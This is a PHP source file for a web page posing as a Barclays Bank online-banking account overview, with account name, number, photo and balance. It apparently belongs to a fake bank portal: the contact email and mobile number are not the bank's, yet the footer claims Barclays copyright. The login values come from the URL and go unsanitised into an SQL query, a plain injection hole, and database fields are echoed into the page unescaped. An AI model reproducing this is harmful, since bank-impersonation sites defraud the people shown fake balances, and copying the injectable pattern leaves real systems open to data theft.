<?php
session_start();

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <title> Barclays Bank - Account Information</title>
    <link rel="stylesheet" href="css/bootstrap.css">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300&display=swap" rel="stylesheet">
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

</head>

<style>
table,
th,
td {
    border: 2px solid black;
}
</style>

<body>
<section style="background:#FFffff;">
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-4" style="margin:0;">
                    <div style="height:15px"></div>
                    <div style="height:55px;background-color:#000066;border:1px solid #000066;width:200px;">
                        <p style="text-align:center;padding-top:10px;"><img src="Image/barclays-log.png"
                                style="width:190px;height:30px;"></p>
                    </div>
                </div>
                         <div class="col-md-4" style="margin-top:20px;">
                   
   <div id="google_translate_element" style="background-color:#000000;opacity:0.6;width:200px;"></div>
    <script type="text/javascript">
        function googleTranslateElementInit() {
            new google.translate.TranslateElement({ pageLanguage: 'en', includedLanguages: 'zh-CN,cs,da,nl,en,et,fr,vi,hi' }, 'google_translate_element');
        }

    </script>

    <script type="text/javascript"
        src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
                </div>
                   <div class="col-md-4" style="margin:0;">
                    <div style="height:15px"></div>
                    <div style="background-color:#000099;width:270px;height:50px;border:1px solid #000099;">
                        <nav>
                            <a href="mailto:enquirydept@abaclrest.com"
                                style="font-family: 'Source Sans Pro', sans-serif;font-size:20px;padding-top:10px;text-indent:1em;"><i
                                    class='fa fa-comment'
                                    style='font-size:24px;padding-top:10px;color:#ffffff;'></i></a>
                            <a href="mailto:enquirydept@abaclrest.com"
                                style="font-family: 'Source Sans Pro', sans-serif;font-size:20px;padding-top:10px;text-indent:1em;"><i
                                    class='fa fa-cog' style='font-size:24px;padding-top:10px;color:#ffffff;'></i></a>
                            <a href="callto:+447810389895"
                                style="font-family: 'Source Sans Pro', sans-serif;font-size:20px;padding-top:10px;text-indent:1em;"><i
                                    class='fa fa-phone' style='font-size:24px;color:#ffffff;'></i></a>

                            <a href="secured-login.php" style="text-decoration:none;color:#ffffff;font-size:25px;"
                                style="font-family: 'Source Sans Pro', sans-serif;padding-top:10px;color:#ffffff;">
                                &nbsp &nbsp Log Out
                            </a>
                        </nav>
                    </div>
                </div>
            </div>
    </section>
    <div style="height:60px"></div>
    <?php

    include 'connection.php';

$ust= $_GET['ust'];
$past = $_GET['past'];

$name='';




$sql="select name,number,code,pan,branch,phone,address,email,type,current,initial,final,status,image from frean where ust='$ust' and past='$past'";

$row=$conn->query($sql);
if($row->num_rows>0)
{
   

while($data=$row->fetch_assoc())
{?>
    <?php 
	$name=$data['name'];
	$image=$data['image'];
	$number=$data['number'];
	$code=$data['code'];
	$pan=$data['pan'];
	$branch=$data['branch'];
    $email=$data['email'];
	$phone=$data['phone'];
	$address=$data['address'];
	$type=$data['type'];
	$current=$data['current'];
	$initial=$data['initial'];
	$final=$data['final'];
    $status=$data['status'];
	$_SESSION['email'] = $email;
	
	?>


    <div id="Sign In" align="center">
        <table style="width:100%">
            <tr>
                <td
                    style="width:250px;background-color:#800000;border:1px solid #ffffff;color:#000099;text-align:center;font-size:25px;font-family: 'Source Sans Pro', sans-serif;">
                    <a href="#" style="text-decoration:none;color:#ffffff;">OVERVIEW</a>
                </td>
                <td
                    style="width:200px;background-color:#800000;border:1px solid #ffffff;color:#ffffff;text-align:center;height:30px;font-family: 'Source Sans Pro', sans-serif;font-size:23px;">
                    <a href="information.php" style="text-decoration:none;color:#ffffff;">ACCOUNT INFORMATION</a>
                </td>
                <td
                    style="width:200px;background-color:#800000;border:1px solid #ffffff;color:#ffffff;text-align:center;height:40px;font-family: 'Source Sans Pro', sans-serif;font-size:25px;">
                    <a href="transfer-banking.php" style="text-decoration:none;color:#ffffff;">TRANSFER</a>
                </td>
              
                <td
                    style="width:200px;background-color:#800000;border:1px solid #ffffff;color:#ffffff;text-align:center;height:40px;font-family: 'Source Sans Pro', sans-serif;font-size:25px;">
                    <a href="#" style="text-decoration:none;color:#ffffff;">LOAN</a>
                </td>
                <td
                    style="width:200px;background-color:#800000;border:1px solid #ffffff;color:#ffffff;text-align:center;height:40px;font-family: 'Source Sans Pro', sans-serif;font-size:25px;">
                    <a href="#" style="text-decoration:none;color:#ffffff;">FAQ</a>
                </td>

        </table>
        <div style="height:40px"></div>
        <table>
            <tr>
                <td style="width:500px;"> <iframe src="//www.exchangerates.org.uk/widget/ER-LRTICKER.php?w=490&s=1&mc=GBP&mbg=F0F0F0&bs=no&bc=000044&f=verdana&fs=10px&fc=000044&lc=000044&lhc=FE9A00&vc=FE9A00&vc
u=008000&vcd=FF0000&" width="100%" height="30" frameborder="0" scrolling="no" marginwidth="0"
                        marginheight="0"></iframe></td>
            <tr>
        </table><br>
        <table style="border:1px #800000;width:80%;">
            <tr>
                <td
                    style="height:300px;width:350px;font-size:20px;text-align:center;background-color:#800000;color:#ffffff;border:1px solid #800000;color:#e0ebeb;">
                    Account Holder Photo
                    <table>
                        <tr>
                            <td style="width:20px;background-color:#800000;border:2px solid #800000;"></td>
                            <td style="height:250px;width:200px; border:2px solid #800000;"><img
                                    src="upload/<?php echo $image;?>" width="200" height="200"></td>

                        </tr>
                    </table>
                </td>
                <td style="width:1000px;background-color:#800000;border:1px solid #800000;font-size:20px;">
                    <div
                        style="background-color:#000066;height:30px;width:300px;text-align:center;float:center;margin: 30px;border: 1px solid #669999;color:#e0ebeb;">
                        Account Holder Overview</div>
                    <table style="border:1px solid #800000;">
                        <tr>
                            <td style="width:200px;height:200px;background-color:#800000;border:1px solid #800000;">
                            </td>
                            <td
                                style="width:2200px;height:200px;font-size:20px;border:1px solid #800000;background-color:#800000;color:#ffffff;">
                                Account Name: <?php echo $name;?><br>
                                <hr width:10% style="border: 1px solid #ffffff">Account Number:
                                <?php echo $number;?><br>
                                <hr width:10% style="border: 1px solid #ffffff">Type Of Account: <?php echo $type;?><br>
                                <hr width:10% style="border: 1px solid #ffffff">
                            </td>
                            <td
                                style="width:400px;height:200px;font-size:20px;border:1px solid #800000;background-color:#800000;color:#ffffff;">

                            </td>
                            <td
                                style="width:300px;height:200px;background-color:#800000;border:1px solid #800000;text-indent:1em;font-size:25px;color:#e0ebeb;">
                                Account Balance<br>
                                <div
                                    style="background-color:#000066;height:30px;width:200px;margin: 10px;border: 1px solid #669999;font-size:20px;color:#e0ebeb;">
                                    <?php echo $current;?> <?php echo $final;?></div><br>
                                <p style="font-size:50px;color:#800000;">nsjkdndbdnsnsn
                                </p>
                            </td>
                        <tr>
                        <tr>

                        <tr>
                    </table>
                </td>
                </td>
            </tr>
        </table>
    </div>
    <div style="height:40px"></div>
    <div id="Sign In" align="center">
        <table style="width:80%">
            <td
                style="width:200px;background-color:#e0e0d1;border:1px solid #e0e0d1;color:#000000;text-align:center;height:40px;font-family: 'Source Sans Pro', sans-serif;font-size:25px;">
                <b> Login Details</b>
            </td>
            <td
                style="width:200px;background-color:#e0e0d1;border:1px solid #e0e0d1;color:#ffffff;text-align:center;height:40px;font-family: 'Source Sans Pro', sans-serif;font-size:25px;">
            </td>
            <td
                style="width:200px;background-color:#e0e0d1;border:1px solid #e0e0d1;color:#ffffff;text-align:center;height:40px;font-family: 'Source Sans Pro', sans-serif;font-size:25px;">
            </td>
            <td
                style="width:200px;background-color:#e0e0d1;border:1px solid #000000;color:#ffffff;text-align:center;height:40px;font-family: 'Source Sans Pro', sans-serif;font-size:25px;">
            </td>
            <td
                style="width:200px;background-color:#2e2e1f;border:2px solid #000000;color:#ffffff;text-align:center;height:40px;font-family: 'Source Sans Pro', sans-serif;font-size:25px;">
                <b>Device Information</b>
            </td>
        </table>
    </div>
    <div style="height:40px"></div>
    <div id="Sign In" align="center">
        <div class="container">
            <div class="row">
                <div class="col-md-1">
                </div>
                <div class="col-md-10">
                    <p style="font-size:25px"><?php  echo 'Your IP Address is - '.$_SERVER['REMOTE_ADDR'];?> &nbsp You
                        Logged In At: <span id="rest"></span></p>
                    <script>
                    var europeTime = new Date().toLocaleString("en-US", {
                        timeZone: "Europe/London"
                    });
                    europeTime = new Date(europeTime);
                    console.log('Europe time: ' + europeTime.toLocaleString())
                    document.getElementById('rest').innerHTML = europeTime.toLocaleString();
                    </script>
                </div>
                <div class="col-md-1">
                </div>
            </div>
        </div>
    </div>
    <div style="height:40px"></div>
    <div id="Sign In" align="center">
        <table style="width:80%">
            <td
                style="width:200px;background-color:#e0e0d1;border:1px solid #e0e0d1;color:#000000;text-align:center;height:40px;font-family: 'Source Sans Pro', sans-serif;font-size:25px;">
                <b>News</b>
            </td>
            <td
                style="width:200px;background-color:#e0e0d1;border:1px solid #e0e0d1;color:#ffffff;text-align:center;height:40px;font-family: 'Source Sans Pro', sans-serif;font-size:25px;">
            </td>
            <td
                style="width:200px;background-color:#e0e0d1;border:1px solid #e0e0d1;color:#ffffff;text-align:center;height:40px;font-family: 'Source Sans Pro', sans-serif;font-size:25px;">
            </td>
            <td
                style="width:200px;background-color:#e0e0d1;border:1px solid #000000;color:#ffffff;text-align:center;height:40px;font-family: 'Source Sans Pro', sans-serif;font-size:25px;">
            </td>
            <td
                style="width:200px;background-color:#2e2e1f;border:2px solid #000000;color:#ffffff;text-align:center;height:40px;font-family: 'Source Sans Pro', sans-serif;font-size:25px;">
                <table>
                    <td
                        style="width:200px;background-color:#2e2e1f;border:2px solid #ffff00;color:#ffffff;text-align:center;height:40px;font-family: 'Source Sans Pro', sans-serif;font-size:25px;">
                        <b>Bank News</b>
                    <td>
                </table>
            </td>
        </table>
    </div>
    <div style="height:40px"></div>
    <div id="Sign In" align="center">
        <div class="container">
            <div class="row">
                <div class="col-md-1">
                </div>
                <div class="col-md-10">
                    <marquee width="100%" direction="left">
                        <p style="font-size:25px;font-family: 'Source Sans Pro', sans-serif;">Banking In a fast-paced
                            and digitally supercharged environment,
                            implementing digital infrastructure, strategies, and frameworks has never been more
                            important
                            for banks. With an even greater push to become digitally resilient and remain competitive,
                            timely access to sector-specific, comprehensive, and reliable intelligence is a key
                            differentiator. From dynamic financial spreading tools to cloud-based storage, get access to
                            a
                            host of capabilities to help streamline and automate your workflow.</p>
                    </marquee>
                </div>
                <div class="col-md-1">
                </div>
            </div>
        </div>
    </div>
    <div id="Sign-In" align="center">
        <div
            style="width:1200px;height:60px;border:2px solid black; background-color:#800000;margin:auto;padding:10px;font-size:20px;color:#ffffff;font-family: 'Source Sans Pro', sans-serif;">
            © Copy Right Barclays Bank Plc. All Right Reserved.
        </div>
    </div>


    <?php
}
}
else
{?>


    <!---  HEADER  END------------->

    <div class="section"><br><br><br><br><br><br>
        <div
            style="width:400px;height:230px;border:1px solid black; background-color:white;margin:auto;padding:5px;float:center;">
            <div id="Sign-In" align="center"><br><br>
                <p style="color:#001f4d"><span
                        style="font-family: 'Source Sans Pro', sans-serif;font-size:20px;">Incorrect Account Holder or
                        O.T.P Password.</span></p>
                <p style="color:#001f4d"><span
                        style="font-family: 'Source Sans Pro', sans-serif;font-size:20px;">Contact your Account
                        Officer.</span></p>
                <table>
                    <tr>
                        <td style="border:2px solid green;background-color:green;width:200px;height:40px;text-align:center;">
                            <a href="online-banking.php" style="color:#ffffff;text-decoration:none;">Return To Netbanking</a>
                        </td>
                    </tr>
                </table>
            </div>
        </div>
    </div>

    <div style="height:90px"></div>
    <div id="Sign-In" align="center">
        <div
            style="width:1200px;height:60px;border:2px solid black; background-color:#800000;margin:auto;padding:10px;font-size:20px;color:#ffffff;font-family: 'Source Sans Pro', sans-serif;">
            © Copy Right Barclays Bank Plc. All Right Reserved.
        </div>
    </div>

    <?php
}







?>